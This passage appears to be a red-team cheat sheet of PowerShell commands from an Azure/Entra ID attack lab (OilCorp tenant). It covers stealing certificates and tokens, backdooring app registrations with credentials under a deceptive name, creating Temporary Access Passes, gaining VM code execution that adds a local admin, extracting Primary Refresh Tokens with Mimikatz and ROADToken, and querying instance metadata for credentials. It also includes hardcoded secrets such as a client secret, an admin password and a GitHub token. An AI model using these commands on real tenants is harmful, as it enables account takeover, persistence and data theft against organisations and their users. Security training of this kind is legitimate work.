$NotBefore              = [math]::Round($NotBeforeTimeSpan, 0)

$jwtHeader = @{
    alg = "RS256"
    typ = "JWT"
    x5t = $AKVCertificate.x5t[0]
}
$jwtPayLoad = @{
    aud = $audience
    exp = $JWTExpiration
    iss = $DataAnalyticsAppID
    jti = [guid]::NewGuid()
    nbf = $NotBefore
    sub = $DataAnalyticsAppID
}

$jwtHeaderBytes  = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader  | ConvertTo-Json))
$jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
$b64JwtHeader    = [System.Convert]::ToBase64String($jwtHeaderBytes)
$b64JwtPayload   = [System.Convert]::ToBase64String($jwtPayloadBytes)

$unsignedJwt      = "$b64JwtHeader.$b64JwtPayload"
$unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)
$hasher           = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
$jwtSha256Hash    = $hasher.ComputeHash($unsignedJwtBytes)
$jwtSha256HashB64 = [Convert]::ToBase64String($jwtSha256Hash) -replace '\+','-' -replace '/','_' -replace '='

# Sign via AKV
$uri     = "$($AKVCertificate.kid)/sign?api-version=7.3"
$headers = @{
    'Authorization' = "Bearer $GISAppKeyVaultToken"
    'Content-Type'  = 'application/json'
}
$response  = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (
    [ordered]@{ alg = 'RS256'; value = $jwtSha256HashB64 } | ConvertTo-Json
)
$signedJWT = "$unsignedJwt.$($response.value)"

# Request ARM token using signed JWT
$uri     = "https://login.microsoftonline.com/$tenantID/oauth2/v2.0/token"
$headers = @{ 'Content-Type' = 'application/x-www-form-urlencoded' }
$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (
    [ordered]@{
        client_id              = $DataAnalyticsAppID
        client_assertion       = $signedJWT
        client_assertion_type  = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
        scope                  = 'https://management.azure.com/.default'
        grant_type             = 'client_credentials'
    }
)
$DataAnalyticsAppToken = $response.access_token
Connect-AzAccount -AccessToken $DataAnalyticsAppToken -AccountId $DataAnalyticsAppID

# Request Storage token using signed JWT
$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (
    [ordered]@{
        client_id              = $DataAnalyticsAppID
        client_assertion       = $signedJWT
        client_assertion_type  = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
        scope                  = 'https://storage.azure.com/.default'
        grant_type             = 'client_credentials'
    }
)
$DataAnalyticsAppStorageToken = $response.access_token

# List containers in storage account
$URL = "https://oildatastore.blob.core.windows.net/?comp=list"
$Params = @{
    URI     = $URL
    Method  = "GET"
    Headers = @{
        "Content-Type"    = "application/json"
        "Authorization"   = "Bearer $DataAnalyticsAppStorageToken"
        "x-ms-version"    = "2017-11-09"
        "accept-encoding" = "gzip, deflate"
    }
}
Invoke-RestMethod @Params -UseBasicParsing

# ============================================================
# STORAGE ACCOUNT PERMISSIONS
# ============================================================

$Access_Token       = (Get-AzAccessToken).Token
$storageAccount     = Get-AzStorageAccount
$SubscriptionID     = (Get-AzSubscription).Id
$ResourceGroupName  = $storageAccount.ResourceGroupName
$StorageAccountName = $storageAccount.StorageAccountName
$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage/storageAccounts/$StorageAccountName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Access_Token" }
}
(Invoke-RestMethod @RequestParams).value | Format-List *

# ============================================================
# BLOB STORAGE — FILE OPERATIONS
# ============================================================

# List files in 'certificates' container
$URL = "https://oildatastore.blob.core.windows.net/certificates?restype=container&comp=list"
$Params = @{
    URI     = $URL
    Method  = "GET"
    Headers = @{
        "Content-Type"    = "application/json"
        "Authorization"   = "Bearer $DataAnalyticsAppStorageToken"
        "x-ms-version"    = "2017-11-09"
        "accept-encoding" = "gzip, deflate"
    }
}
$XML = Invoke-RestMethod @Params -UseBasicParsing
# Remove BOM and list blob names
$XML.TrimStart([char]0xEF, [char]0xBB, [char]0xBF) |
    Select-Xml -XPath "//Name" |
    ForEach-Object { $_.node.InnerXML }

# Download a specific blob file
$URL = "https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt"
$Params = @{
    URI     = $URL
    Method  = "GET"
    Headers = @{
        "Content-Type"    = "application/json"
        "Authorization"   = "Bearer $DataAnalyticsAppStorageToken"
        "x-ms-version"    = "2017-11-09"
        "accept-encoding" = "gzip, deflate"
    }
}
$cert = Invoke-RestMethod @Params -UseBasicParsing
$cert

# Write cert to disk
$secretByte = [Convert]::FromBase64String($cert)
[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\spcert.pfx", $secretByte)

# Match cert thumbprint against app key credentials
$spCertificate = New-Object `
    System.Security.Cryptography.X509Certificates.X509Certificate2 `
    -ArgumentList 'C:\AzAD\Tools\spcert.pfx'
Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml |
    Where-Object { $_.keyCredentials.customKeyIdentifier -eq $spCertificate.Thumbprint }

# ---- Modify blob tags (e.g. to satisfy ABAC condition) ----

$URL = "https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt?comp=tags"
$Params = @{
    URI     = $URL
    Method  = "PUT"
    Headers = @{
        "Content-Type"  = "application/xml; charset=UTF-8"
        "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
        "x-ms-version"  = "2020-04-08"
    }
}
$Body = @"
<?xml version="1.0" encoding="utf-8"?>
<Tags>
    <TagSet>
        <Tag>
            <Key>Department</Key>
            <Value>Geology</Value>
        </Tag>
    </TagSet>
</Tags>
"@
Invoke-RestMethod @Params -UseBasicParsing -Body $Body

# ============================================================
# ENTRA ID ROLE ASSIGNMENTS VIA GRAPH (cert auth, no subscription)
# ============================================================

[X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
Connect-MgGraph `
    -Certificate $GeologyAppCertificate `
    -ClientId    b1d10eb3-d631-499f-8197-f13de675904c `
    -TenantId    d6bd5a42-7c65-421c-ad23-a25a5d5fa57f

# Get SP for current app
Get-MgServicePrincipal -Filter "DisplayName eq 'GeologyApp'"

# Get Entra ID roles for the SP
Get-MgRoleManagementDirectoryRoleAssignment `
    -Filter "principalId eq 'eef35297-f198-4dd9-9027-04dc69a05ca2'" |
    ForEach-Object {
        $roleDef = Get-MgRoleManagementDirectoryRoleDefinition `
            -UnifiedRoleDefinitionId $_.RoleDefinitionId
        [PSCustomObject]@{
            RoleDisplayName  = $roleDef.DisplayName
            RoleId           = $roleDef.Id
            DirectoryScopeId = $_.DirectoryScopeId
        }
    } | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | Format-List

# Get app role assignments for a SP
Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId 578e381a-8f03-4cae-8b3e-559d02023ee1 | Format-List

# Get a specific app role definition
(Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'").AppRoles |
    Where-Object { $_.Id -eq '246dd0d5-5bd0-4def-940b-0421030a5b68' } |
    Format-List

# ---- Administrative Unit members ----

Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId b14fcc2e-7a5a-4935-b4a5-835fd8018efe |
    Select-Object Id, @{
        Name       = 'userPrincipalName'
        Expression = { $_.AdditionalProperties.userPrincipalName }
    } | Format-List

# ---- Application Administrator — add creds to app ----

Get-MgApplication -ApplicationId da53a80e-cb86-4158-96e1-7b19f7fec496

$passwordCred = @{
    displayName = 'Added by Azure Service Bus - DO NOT DELETE'
    endDateTime = (Get-Date).AddMonths(6)
}
Add-MgApplicationPassword `
    -ApplicationId      da53a80e-cb86-4158-96e1-7b19f7fec496 `
    -PasswordCredential $passwordCred

# Get owned objects for a SP
Get-MgServicePrincipalOwnedObject -ServicePrincipalId 1e2dc461-ecae-4a2b-aa61-3aa8622c1344 |
    Select-Object Id,
        @{ Name = 'displayName';  Expression = { $_.AdditionalProperties.displayName } },
        @{ Name = 'ObjectType';   Expression = { $_.AdditionalProperties.'@odata.type' } } |
    Format-List

# Add a user to a group
New-MgGroupMember `
    -GroupId           91f7bfb1-b326-4376-8953-5d6d9b44e443 `
    -DirectoryObjectId 2b269505-f49b-42c1-ae65-d22dc1faabe4 `
    -Verbose

# ============================================================
# CONDITIONAL ACCESS POLICIES (CAPs)
# ============================================================

Connect-MgGraph `
    -Certificate $GeologyAppCertificate `
    -ClientId    b1d10eb3-d631-499f-8197-f13de675904c `
    -TenantId    d6bd5a42-7c65-421c-ad23-a25a5d5fa57f

# Check current scopes (need Policy.Read.All)
Get-MgContext

# Enumerate all CAPs
Get-MgIdentityConditionalAccessPolicy | ConvertTo-Json -Depth 10 | Out-File caps.json

# Enumerate CAPs via REST
$URI = 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $GraphToken" }
}
$CAPs = (Invoke-RestMethod @RequestParams).value | ForEach-Object { $_ | ConvertTo-Json -Depth 10 }

# Extract access token from MgGraph in-memory cache (when you need raw token)
$InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod(
    "ReadTokenData",
    [System.Reflection.BindingFlags]::NonPublic + [System.Reflection.BindingFlags]::Instance
)
$TokenData    = $InMemoryTokenCacheGetTokenData.Invoke(
    [Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,
    $null
)
$TokenObjStr  = [System.Text.Encoding]::UTF8.GetString($TokenData)
$obj          = $TokenObjStr -Split "`"secret`":`""
$obj          = $obj[1] -Split "`",`"credential_type"
$token        = $obj[0]

# ============================================================
# TEMPORARY ACCESS PASS (TAP)
# ============================================================

# Check if TAP is enabled (requires Policy.Read.All)
(Get-MgPolicyAuthenticationMethodPolicy).AuthenticationMethodConfigurations

# Create a TAP for a user
$properties = @{
    isUsableOnce  = $true
    startDateTime = (Get-Date).AddMinutes(60)
}
New-MgUserAuthenticationTemporaryAccessPassMethod `
    -UserId          explorationsyncuser61@oilcorporation.onmicrosoft.com `
    -BodyParameter   ($properties | ConvertTo-Json)

# ============================================================
# SERVICE PRINCIPAL CREDENTIAL AUTH
# ============================================================

# Authenticate as SP using client secret
$passwd = ConvertTo-SecureString "ylz8Q~kasdfasdfasfdasdfasZZZZdfas" -AsPlainText -Force
$creds  = New-Object System.Management.Automation.PSCredential(
    "ebf26192-9eb1-47a8-8554-739ef769b00a",
    $passwd
)
Connect-AzAccount `
    -ServicePrincipal `
    -Credential       $creds `
    -Tenant           4e7a1151-36d0-457e-b489-729cf0fb315a

Connect-MgGraph `
    -ClientSecretCredential $creds `
    -TenantId               d6bd5a42-7c65-421c-ad23-a25a5d5fa57f

# ---- Dynamic group abuse ----
Update-MgUser `
    -UserId      5dec6744-f973-4fb7-ab07-2542d41dfb75 `
    -OtherMails  @('vendor17@defcorpextcontractors.onmicrosoft.com')

# ============================================================
# LIST ALL RESOURCE PERMISSIONS
# ============================================================

$FormatEnumerationLimit = -1  # Disable truncation
$Resources = Get-AzResource
$Token     = (Get-AzAccessToken).Token

foreach ($Resource in $Resources) {
    $ID  = $Resource.Id
    $URI = "https://management.azure.com/$ID/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    $RequestParams = @{
        Method      = 'GET'
        Uri         = $URI
        Headers     = @{ 'Authorization' = "Bearer $Token" }
        ContentType = "application/json"
    }
    $Result       = Invoke-RestMethod @RequestParams
    $ResourceName = $Resource.Name
    Write-Output "ResourceName - $ResourceName"
    Write-Output "Permissions -"
    $Result.value | Format-List *
}

# ============================================================
# ACCESS USER INBOX EMAILS
# ============================================================

Connect-MgGraph -AccessToken ($AccessToken | ConvertTo-SecureString -AsPlainText -Force)
Get-MgUserMessage -UserId CaseyRSawyer@oilcorporation.onmicrosoft.com | Format-List

# ============================================================
# VM EXTENSION — CODE EXECUTION
# ============================================================

# Get existing extensions
Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"

# Write extension to execute arbitrary command (add local admin)
Set-AzVMExtension `
    -ResourceGroupName  "Research" `
    -ExtensionName      "ExecCmd" `
    -VMName             "infradminsrv" `
    -Location           "Germany WestCentral" `
    -Publisher          Microsoft.Compute `
    -ExtensionType      CustomScriptExtension `
    -TypeHandlerVersion 1.8 `
    -SettingString      '{"commandToExecute":"powershell net users student17 Stud17Password@123 /add /Y; net localgroup administrators student17 /add"}'

# ============================================================
# PRT EXTRACTION
# ============================================================

# Get nonce (can be run from any machine)
$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
$URL      = "https://login.microsoftonline.com/$TenantId/oauth2/token"
$Params   = @{ URI = $URL; Method = "POST" }
$Body     = @{ grant_type = "srv_challenge" }
$Result   = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce

# Use the nonce to extract PRT
C:\Users\student17\Documents\ROADToken.exe $Result.Nonce

# Copy tools to remote session and extract PRT from a target user's session
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe       -Destination C:\Users\student17\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe        -Destination C:\Users\student17\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student17\Documents -Verbose

Invoke-Command -Session $infradminsrv -ScriptBlock {
    C:\Users\student17\Documents\PsExec64.exe -accepteula -s "cmd.exe" `
        "/c C:\Users\student17\Documents\SessionExecCommand.exe MichaelMBarron C:\Users\student17\Documents\ROADToken.exe <NONCE> > C:\Temp\PRT17.txt"
}
Invoke-Command -Session $infradminsrv -ScriptBlock { cat C:\Temp\PRT17.txt }

# Extract PRT via Mimikatz
Invoke-Command -Session $infradminsrv -ScriptBlock {
    . C:\Users\student17\Documents\Invoke-Mimikatz.ps1
    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" "exit"'
}

# Extract PRT via AADInternals
Get-AADIntUserPRTToken

# ============================================================
# AD-JOINED DEVICE RECON
# ============================================================

# Check if machine is AD/AAD joined
dsregcmd /status

# Get user data from instance metadata
$userData = Invoke-RestMethod `
    -Headers @{ "Metadata" = "true" } `
    -Method  GET `
    -Uri     "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Alternative (AWS-style metadata — check if EC2)
(Invoke-WebRequest http://169.254.169.254/latest/user-data -UseBasicParsing).RawContent
(Invoke-WebRequest http://169.254.169.254/latest/meta-data/hostname -UseBasicParsing).Content
(Invoke-WebRequest http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance -UseBasicParsing).Content

# List running processes with username
Get-Process -IncludeUserName | ForEach-Object {
    [PSCustomObject]@{
        procName = $_.ProcessName
        username = $_.UserName
        Id       = $_.Id
    }
}

# ============================================================
# DUMP OFFICE / ONEDRIVE ACCESS TOKENS FROM DISK
# ============================================================

# Copy tools to target session
Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\TBRES\               -Destination C:\Users\Public\student61 -Recurse -Verbose
Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\Invoke-RunasCs.ps1   -Destination C:\Users\Public\student61 -Verbose

# Run TBRES as local admin to decrypt tokens
. C:\Users\Public\student61\Invoke-RunasCs.ps1
Invoke-RunasCs `
    -Username administrator `
    -Password '%dlTKmropc!1l3I(o1j5834H$0VZ))2p' `
    -Command  C:\Users\Public\student61\TBRES.exe

# Find most recently written decrypted token files
Get-ChildItem C:\Windows\System32\*.decrypted |
    Sort-Object -Property LastWriteTime -Descending

# Check aud claim of each JWT to identify Graph tokens

# ---- OneDrive file enumeration using Graph AT ----

$GraphAccessToken = "..."
$Params = @{
    URI     = "https://graph.microsoft.com/beta/me/drive/root/children"
    Method  = "GET"
    Headers = @{
        "Authorization" = "Bearer $GraphAccessToken"
        "Content-Type"  = "application/json"
    }
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

# Get download URL for a specific file
($Result.value | Where-Object { $_.Name -eq 'accessingplantinfo.ps1' }).'@microsoft.graph.downloadUrl'

# ============================================================
# LOGIC APPS
# ============================================================

# Check permissions on a Logic App
$accesstoken = (Get-AzAccessToken).Token
$URI = "https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-oyglsntcfh3343536/providers/Microsoft.Logic/workflows/ASyaivrkblez3343584/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $accesstoken" }
}
(Invoke-RestMethod @RequestParams).value.actions

# Get Logic App definition
(Get-AzLogicApp -Name ASyaivrkblez3343584).Definition

# Get callback URL for Logic App trigger
Get-AzLogicAppTriggerCallbackUrl `
    -TriggerName       manual `
    -Name              ASyaivrkblez3343584 `
    -ResourceGroupName AS-oyglsntcfh3343536

# Execute Logic App via callback URL
Invoke-RestMethod `
    -Method          GET `
    -UseBasicParsing `
    -Uri             'https://prod-54.southeastasia.logic.azure.com:443/workflows/e0dc8e964e5a4556a347d4fceef1417e/triggers/manual/paths/invoke?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=_YiemEHZwmmdThIlXH_JLX-8-ubyxWEK0DqvV0NRENM'

# ============================================================
# ON-PREMISES AD (HYBRID)
# ============================================================

# NOTE: Password must NOT contain '!'
# Add host file entries for DC and domain before running:
#   172.16.30.1 reservoirone.corp
#   172.16.30.1 reservoirone-dc.reservoirone.corp

runas /netonly /user:reservoirone.corp\hybriduser1 cmd
C:\AzAD\Tools\InviShell\RunWithPathAsAdmin.bat

. C:\AzAD\Tools\PowerView.ps1
Get-DomainComputer `
    -DomainController reservoirone-dc.reservoirone.corp `
    -Domain           reservoirone.corp

# Get all ACLs for domain, resolve SIDs to names
Get-DomainObjectAcl `
    -SearchBase        "DC=reservoirone,DC=corp" `
    -SearchScope       Base `
    -ResolveGUIDs `
    -DomainController  reservoirone-dc.reservoirone.corp `
    -Domain            reservoirone.corp |
    Where-Object {
        ($_.ObjectAceType -match 'replication-get') -or
        ($_.ActiveDirectoryRights -match 'GenericAll')
    } | ForEach-Object {
        $_ | Add-Member NoteProperty 'IdentityName' $(
            Convert-SidToName $_.SecurityIdentifier `
                -DomainController reservoirone-dc.reservoirone.corp `
                -Domain reservoirone.corp
        )
        $_
    }

# ============================================================
# GITHUB
# ============================================================

$accessToken = "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"
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type"  = "application/json"
}

# Create an issue
$body = @{ title = "NewIssueX"; body = "NewIssueX" } | ConvertTo-Json -Depth 4
Invoke-RestMethod `
    -Uri    "https://api.github.com/repos/OilCorp/awsautomation/issues" `
    -Method Post `
    -Headers $headers `
    -Body    $body

# Read comments on a specific issue
(Invoke-RestMethod `
    -Uri     "https://api.github.com/repos/OilCorp/awsautomation/issues/39/comments" `
    -Method  Get `
    -Headers $headers).body

# ============================================================
# MICROSOFT TEAMS — CHAT ENUMERATION
# ============================================================

# List all chats
Get-MgChat | Format-List

# List messages in a chat
Get-MgChatMessage `
    -ChatId 19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces |
    Format-List

# Read body of a specific message
(Get-MgChatMessage `
    -ChatId          19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces `
    -ChatMessageId   1684154301636).Body.Content

# Find a specific user
Get-MgUser -All | Where-Object { $_.DisplayName -like "*Carl*" }

# ============================================================
# AZURE ARC — CONNECTED MACHINE
# ============================================================

# Check for managed service assignments
Get-AzManagedServicesAssignment | Format-List *

# Execute command on Arc machine (output takes 10-15 min)
New-AzConnectedMachineRunCommand `
    -MachineName       'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName    'SQLQueryX' `
    -Location          'East US' `
    -SourceScript      "whoami"

# Check for SQL Server on Arc machine (potential linked server)
New-AzConnectedMachineRunCommand `
    -MachineName       'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName    'SQLQueryX' `
    -Location          'East US' `
    -SourceScript      "net start | Select-String 'SQL'"

# List linked servers on local SQL instance
New-AzConnectedMachineRunCommand `
    -MachineName       'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName    'SQLQueryX' `
    -Location          'East US' `
    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers')`""

# Check if EDI linked server has further linked servers
New-AzConnectedMachineRunCommand `
    -MachineName       'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName    'SQLQueryX' `
    -Location          'East US' `
    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers') AT [EDI]`""

# Retrieve databases from AZURESQL via EDI linked server
New-AzConnectedMachineRunCommand `
    -MachineName       'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName    'SQLQueryX' `
    -Location          'East US' `
    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_catalogs AZURESQL') AT [EDI]`""

# List tables in 'oilcorp_logistics_database'
New-AzConnectedMachineRunCommand `
    -MachineName       'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName    'SQLQueryX' `
    -Location          'East US' `
    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_tables_ex @table_server = AZURESQL, @table_catalog = oilcorp_logistics_database') AT [EDI]`""

# Query 'inventory' table from oilcorp_logistics_database
New-AzConnectedMachineRunCommand `
    -MachineName       'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName    'SQLQueryX' `
    -Location          'East US' `
    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('SELECT * FROM [AZURESQL].[oilcorp_logistics_database].[dbo].[inventory]') AT [EDI]`""

# Get cert thumbprint
Get-PfxCertificate -FilePath C:\Users\studentuserX\Downloads\Miro_Certificate.pfx

##
# ============================================================
# PASS-THE-PRT
# ============================================================

# Inject PRT cookie into browser session using AADInternals
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1

# Create a seamless SSO token from PRT
$PRT = "eyJ0eXAiOiJKV1Qi..."  # PRT token from ROADToken/Mimikatz
$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"

# Get a PRT cookie to inject into Edge/Chrome
$PRTCookie = New-AADIntUserPRTToken `
    -RefreshToken $PRT `
    -GetNonce

# Use the cookie in browser:
# Chrome/Edge -> F12 -> Application -> Cookies -> x-ms-RefreshTokenCredential -> paste value
# Then navigate to https://portal.azure.com

# ============================================================
# PRIVILEGE ESCALATION — ABUSING AZURE RBAC MISCONFIGURATIONS
# ============================================================

# Check for Owner/Contributor on subscription
Get-AzRoleAssignment | Where-Object {
    $_.RoleDefinitionName -in @('Owner','Contributor') -and
    $_.Scope -like '*/subscriptions/*'
}

# Check for User Access Administrator (can grant themselves any role)
Get-AzRoleAssignment | Where-Object {
    $_.RoleDefinitionName -eq 'User Access Administrator'
}

# Assign Owner to self if UAA is held
New-AzRoleAssignment `
    -SignInName        attacker@tenant.onmicrosoft.com `
    -RoleDefinitionName Owner `
    -Scope             "/subscriptions/<subscription-id>"

# ============================================================
# PRIVILEGE ESCALATION — ENTRA ID ROLES
# ============================================================

# Check for privileged Entra ID roles on current user
Get-MgRoleManagementDirectoryRoleAssignment `
    -Filter "principalId eq '$($currentUser.Id)'" |
    ForEach-Object {
        (Get-MgRoleManagementDirectoryRoleDefinition `
            -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName
    }

# Privileged roles to look for:
# - Global Administrator
# - Privileged Role Administrator     <- can assign any role
# - Application Administrator         <- can add creds to any app
# - Cloud Application Administrator   <- same but no App Proxy
# - Hybrid Identity Administrator     <- can abuse AAD Connect
# - Helpdesk Administrator            <- can reset passwords (scoped)
# - Authentication Administrator      <- can reset MFA/auth methods

# ============================================================
# CROSS-TENANT ATTACKS
# ============================================================

# Enumerate tenants accessible via current tokens (guest/B2B)
Get-AzTenant

# Switch context to another tenant
Connect-AzAccount -Tenant <target-tenant-id>

# Check for guest user access in foreign tenant
$Token = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com -TenantId <target-tenant-id>).Token
$URI   = 'https://graph.microsoft.com/v1.0/organization'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Token" }
}
Invoke-RestMethod @RequestParams

# Enumerate what resources a guest can see in target tenant
Get-AzResource -TenantId <target-tenant-id>
Get-AzRoleAssignment -TenantId <target-tenant-id>

# ============================================================
# MANAGED IDENTITY — PRIVILEGE ESCALATION
# ============================================================

# From inside an App Service / VM / Function App with MI enabled:
# Check what the MI can do across all resources
$Token = (Invoke-RestMethod `
    -Uri     "$env:IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" `
    -Headers @{ secret = $env:IDENTITY_HEADER }).access_token

Connect-AzAccount -AccessToken $Token -AccountId <mi-client-id>
Get-AzRoleAssignment  # see what the MI is assigned to
Get-AzResource        # see what it can enumerate

# ============================================================
# AZURE DEVOPS RECON (if encountered)
# ============================================================

$ADOOrg   = "OilCorp"
$ADOToken = "..."  # PAT or Bearer token

$headers = @{ Authorization = "Bearer $ADOToken" }

# List projects
Invoke-RestMethod `
    -Uri     "https://dev.azure.com/$ADOOrg/_apis/projects?api-version=7.1" `
    -Headers $headers

# List pipelines in a project
Invoke-RestMethod `
    -Uri     "https://dev.azure.com/$ADOOrg/OilCorpProject/_apis/pipelines?api-version=7.1" `
    -Headers $headers

# List variable groups (may contain secrets)
Invoke-RestMethod `
    -Uri     "https://dev.azure.com/$ADOOrg/OilCorpProject/_apis/distributedtask/variablegroups?api-version=7.1" `
    -Headers $headers

# List service connections (may contain SP creds/certs)
Invoke-RestMethod `
    -Uri     "https://dev.azure.com/$ADOOrg/OilCorpProject/_apis/serviceendpoint/endpoints?api-version=7.1" `
    -Headers $headers
# ============================================================
